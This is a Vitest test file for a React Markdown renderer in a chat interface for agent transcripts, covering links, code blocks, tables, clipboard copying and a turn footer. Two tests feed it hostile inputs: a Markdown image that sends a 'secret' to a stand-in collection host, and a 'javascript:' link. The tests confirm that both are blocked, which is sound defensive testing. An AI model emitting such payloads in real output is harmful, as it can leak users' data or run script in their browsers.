import { afterEach, describe, expect, it, vi } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'
import { copyText, MessageMarkdown, renderedText } from './MessageMarkdown'
import { TurnFooter } from './SessionChat'
import { wideTableAnswer } from './fixtures/scenarios'

it('does not auto-load remote images from an agent transcript', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={'![private screenshot](https://example.invalid/collect?secret=prompt)'} />)
  expect(html).not.toContain('<img')
  expect(html).toContain('private screenshot')
})
it('renders links without opener or referrer and drops script URLs', () => {
  const external = renderToStaticMarkup(<MessageMarkdown text={'[source](https://example.com)'} />)
  expect(external).toContain('rel="noopener noreferrer"')
  const script = renderToStaticMarkup(<MessageMarkdown text={'[run](javascript:alert(1))'} />)
  expect(script).not.toContain('javascript:')
})
it('gives a fenced block a language label and a copy action', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={'```ts\nconst a = 1\n```'} />)
  expect(html).toContain('>ts<')
  expect(html).toContain('aria-label="코드 복사"')
  expect(html).toContain('const a = 1')
})
it('keeps inline code free of block controls and machine translation', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={'use `pnpm test` here'} />)
  expect(html).not.toContain('코드 복사')
  expect(html).toContain('translate="no"')
})
it('lets a wide table scroll on its own', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={'| a | b |\n| - | - |\n| 1 | 2 |'} />)
  expect(html).toMatch(/<div[^>]*data-scroll="x"[^>]*><table/)
})
it('wraps the twelve-column fixture table in its own scroll container', () => {
  const html = renderToStaticMarkup(<MessageMarkdown text={wideTableAnswer} />)
  expect(html.match(/<table/g)).toHaveLength(1)
  expect(html).toMatch(/<div[^>]*data-scroll="x"[^>]*><table>/)
  expect(html).toMatch(/<\/table><\/div>/)
  const header = /<thead>(.*?)<\/thead>/.exec(html)?.[1] ?? ''
  expect(header.match(/<th[ >]/g)?.length).toBeGreaterThanOrEqual(12)
})

describe('copy', () => {
  afterEach(() => vi.unstubAllGlobals())
  it('writes the text to the clipboard and reports a refusal or a missing clipboard as a failure', async () => {
    const writeText = vi.fn(async (_text: string) => {})
    vi.stubGlobal('navigator', { clipboard: { writeText } })
    expect(await copyText('## 원인\n\n- a')).toBe(true)
    expect(writeText).toHaveBeenCalledWith('## 원인\n\n- a')
    vi.stubGlobal('navigator', { clipboard: { writeText: async () => { throw new DOMException('denied', 'NotAllowedError') } } })
    expect(await copyText('x')).toBe(false)
    vi.stubGlobal('navigator', {})
    expect(await copyText('x')).toBe(false)
  })
  it('reads the rendered text without code block captions and restores them', () => {
    const caption = { hidden: false }
    const prose = {
      querySelectorAll: () => [caption],
      get innerText() { return caption.hidden ? '원인\n\nconst a = 1\n' : '원인\n\nts\n복사\nconst a = 1\n' },
    } as unknown as HTMLElement
    expect(renderedText(prose)).toBe('원인\n\nconst a = 1')
    expect(caption.hidden).toBe(false)
  })
})

describe('turn footer', () => {
  const answer = { id: 'a1', role: 'assistant' as const, text: '**done**', timestamp: '2026-10-27T10:02:36Z' }
  it('offers Markdown and plain text copies of the answer beside the duration', () => {
    const html = renderToStaticMarkup(<TurnFooter summary={{ duration: 156_000, answer }} />)
    expect(html).toContain('aria-label="답변을 Markdown으로 복사"')
    expect(html).toContain('aria-label="답변을 텍스트로 복사"')
    expect(html).toContain('작업 시간 2분 36초')
  })
  it('shows only the duration when the turn has no answer text', () => {
    const html = renderToStaticMarkup(<TurnFooter summary={{ duration: 9_000 }} />)
    expect(html).toContain('작업 시간 9초')
    expect(html).not.toContain('복사')
  })
})
